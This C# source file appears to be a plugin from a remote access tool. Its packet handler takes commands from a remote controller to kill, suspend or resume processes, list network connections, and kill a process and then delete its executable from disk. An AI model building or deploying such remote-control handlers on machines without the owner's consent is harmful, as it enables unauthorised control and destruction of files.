using System;
using System.Diagnostics;
using System.IO;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Kill":
				HandleNetstat.KillProcess((int)array[1]);
				break;
			case "Suspend":
				HandleNetstat.SuspendProcess((int)array[1]);
				break;
			case "Resume":
				HandleNetstat.ResumeProcess((int)array[1]);
				break;
			case "KillRemove":
			{
				string? fileName = Process.GetProcessById((int)array[1]).MainModule.FileName;
				HandleNetstat.KillProcess((int)array[1]);
				File.Delete(fileName);
				break;
			}
			case "Refresh":
				HandleNetstat.NetstatList();
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Netstat", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}
}
